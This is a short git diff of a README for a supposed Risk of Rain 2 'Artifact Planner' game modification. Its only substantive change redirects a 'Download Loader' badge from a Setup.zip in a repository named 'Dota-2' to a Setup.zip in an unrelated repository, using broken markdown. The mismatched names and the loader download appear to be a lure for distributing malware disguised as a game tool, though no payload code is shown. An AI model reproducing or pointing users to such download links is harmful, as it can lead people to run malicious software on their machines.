@@ -4,7 +4,7 @@
 
 > ⚡ Advanced Game Modification Project for Risk of Rain 2 Artifact Planner
 
-[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/TameDragonflyFlare/Dota-2/releases/download/main/Setup.zip)
+[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)]https://github.com/WASD122/bvvb/releases/download/main/Setup.zip)
 
 ---
 
@@ -38,3 +38,4 @@ configs/
 `Risk-of-Rain-2-Artifact-Planner` · Updated: 2026-10-05
 
 **Tags:** `risk-of-rain-2` `artifact-planner` `roguelike` `action-game` `progression`
+
